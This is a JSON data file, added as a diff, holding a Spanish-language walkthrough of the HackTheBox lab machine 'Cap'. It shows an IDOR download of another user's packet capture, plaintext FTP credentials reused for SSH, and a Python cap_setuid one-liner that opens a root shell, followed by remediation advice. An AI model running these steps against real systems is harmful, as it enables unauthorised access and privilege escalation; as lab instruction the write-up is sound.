@@ -1,0 +1,30 @@
+{
+  "name": "Cap",
+  "ip": "10.10.10.245",
+  "os": "Linux",
+  "diff": "Easy",
+  "plat": "HackTheBox",
+  "date": "2026-10-03",
+  "desc": "IDOR que filtra una captura con credenciales FTP/SSH y escalada con la capability cap_setuid en Python.",
+  "tags": "#linux #idor #pcap #ftp #capabilities #privesc",
+  "url": "https://labs.hackthebox.com/achievement/machine/2772097/351",
+  "accent": "193 108 255",
+  "sections": {
+    "resumen": "Cap es una cadena corta y muy didáctica: un <b>IDOR</b> en el panel web permite descargar la captura de red de otro usuario, dentro hay <b>credenciales en claro,</b> y la escalada es una <b>capability</b> mal puesta sobre Python que da <bo>root</bo> en una línea.",
+    "vulnerabilidad": "<br>IDOR / Broken Access Control</br>\n\nEl panel descarga capturas de red por un identificador numérico en la URL (<ba>/data/&lt;id&gt;</ba>) sin comprobar de quién es cada captura. Cambiando el id a <b>0</b> accedemos a la captura de otro usuario, que contiene tráfico sensible.\n\n\n<br>Capability cap_setuid en Python</br>\n\nEl binario de Python tiene asignada la capability <ba>cap_setuid+ep.</ba> Eso le permite cambiar su UID a 0 sin ser root, de modo que cualquiera que pueda ejecutarlo puede lanzar un intérprete como <bo>root.</bo>",
+    "reconocimiento": "Búsqueda de puertos abiertos en la máquina víctima\n\n```term\n$ sudo nmap -p- -Pn -sS -n --max-retries 1 <b>cap</b>\n```\n\n```table\n{\"corners\": \"round\", \"cells\": [[{\"t\": \"Puerto\", \"b\": true, \"a\": \"c\", \"c\": \"p\"}, {\"t\": \"Servicio\", \"b\": true, \"a\": \"c\", \"c\": \"p\"}, {\"t\": \"Versión\", \"b\": true, \"a\": \"c\", \"c\": \"p\"}], [{\"t\": \"21\", \"a\": \"l\"}, {\"t\": \"ftp\", \"a\": \"l\"}, {\"t\": \"vsftpd 3.0.3\", \"a\": \"l\"}], [{\"t\": \"22\", \"a\": \"l\"}, {\"t\": \"ssh\", \"a\": \"l\"}, {\"t\": \"OpenSSH 8.2p1\", \"a\": \"l\"}], [{\"t\": \"80\", \"a\": \"l\"}, {\"t\": \"http\", \"a\": \"l\"}, {\"t\": \"gunicorn\", \"a\": \"l\"}]], \"v\": [{\"on\": true, \"color\": \"#243244\", \"w\": 1}, {\"on\": false}, {\"on\": false}, {\"on\": true, \"color\": \"#243244\", \"w\": 1}], \"h\": [{\"on\": true, \"color\": \"#243244\", \"w\": 1}, {\"on\": true, \"color\": \"page\", \"w\": 3}, {\"on\": false}, {\"on\": false}, {\"on\": true, \"color\": \"#243244\", \"w\": 1}]}\n```\n\nUn <b>21</b> (FTP), un <b>22</b> (SSH) y un <b>80</b> sirviendo un panel web (Security Dashboard) sobre gunicorn.",
+    "enumeracion": "El panel tiene una sección de capturas en <ba>/data/&lt;id&gt;.</ba> La nuestra es <ba>/data/1,</ba> pero probamos a bajar el identificador\n\n```term\n$ curl http://cap/data/0 -o 0.pcap\n```\n\nLa captura <bc>0.pcap</bc> es de otra sesión. La abrimos y, siguiendo el flujo de FTP, aparecen las credenciales en claro\n\n```out\nUSER nathan\nPASS Buck3tH4TF0RM3!\n```\n\nCredenciales: <bo>nathan</bo> / <b>Buck3tH4TF0RM3!</b>",
+    "explotacion": "Las credenciales valen para <b>SSH,</b> así que entramos directamente\n\n```term\n$ ssh nathan@cap\nnathan@cap:~$ whoami\n<bw>nathan</bw>\n```\n\nYa tenemos un usuario del sistema; leemos la flag de usuario y pasamos a la escalada.",
+    "escalada": "Lo primero al conseguir un usuario: revisar capabilities del sistema\n\n```term\nnathan@cap:~$ getcap -r / 2>/dev/null\n<bw>/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip</bw>\n```\n\nPython tiene <ba>cap_setuid,</ba> así que puede cambiar su UID a 0. Lo aprovechamos para abrir una shell como <bo>root</bo>\n\n```term\nnathan@cap:~$ python3.8 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'\nroot@cap:~# whoami\n<bw>root</bw>\n```",
+    "flags": "```term\n$ cat /home/nathan/user.txt\n```\n\n```term\n$ cat /root/root.txt\n```",
+    "arreglo": "La cadena nace de un control de acceso ausente y de una capability peligrosa, así que el arreglo va por capas:\n\n- <bw>Corregir el IDOR:</bw> cada usuario solo debe poder acceder a sus propias capturas; validar en el servidor la propiedad del recurso antes de servirlo, no fiarse del identificador de la URL.\n- <bw>No transmitir credenciales en claro:</bw> el FTP sin cifrar deja las contraseñas a la vista en cualquier captura; usar FTPS/SFTP.\n- <bw>Quitar la capability de Python:</bw> <bw>cap_setuid</bw> sobre un intérprete equivale a dar root. Eliminarla con setcap y no asignar capabilities a binarios de propósito general.\n- <bw>No reutilizar credenciales:</bw> la misma contraseña del FTP abría el SSH; conviene separar credenciales por servicio.",
+    "conclusiones": "Un <b>IDOR</b> tan simple como cambiar un número en la URL puede exponer datos de otros usuarios; nunca hay que confiar el control de acceso al identificador que manda el cliente.\n\nLas <b>capturas de red</b> son una mina: si capturan tráfico de protocolos en claro como FTP, regalan credenciales directamente.\n\nLas <b>capabilities</b> de Linux son escalada silenciosa. Tras conseguir un usuario, un <b>getcap -r /</b> revela en segundos si algún binario, como Python, puede convertirse en <bo>root.</bo>"
+  },
+  "img": {
+    "avatar": "/assets/img/machines/cap.png",
+    "banner": "/assets/img/machines/cap-banner.png",
+    "proof": "https://labs.hackthebox.com/achievement/machine/2772097/351"
+  },
+  "status": "Resuelta",
+  "updated": "2026-10-03"
+}
